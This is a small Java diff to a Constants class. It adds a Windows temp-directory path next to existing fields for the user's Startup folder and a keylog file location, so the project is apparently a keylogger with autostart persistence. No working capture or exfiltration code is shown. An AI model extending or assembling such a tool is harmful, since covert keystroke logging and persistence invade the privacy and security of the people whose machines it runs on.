@@ -11,6 +11,7 @@ public class Constants {
   public static String USER_HOME = System.getProperty("user.home");
   public static String STARTUP_LOCATION =
       Constants.USER_HOME + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+  public static String SYS_TEMP_LOCATION = System.getenv("windir") + "\\Temp";
 
   public static String CURRENT_LOCATION;
   public static String KEYLOG_LOCATION;
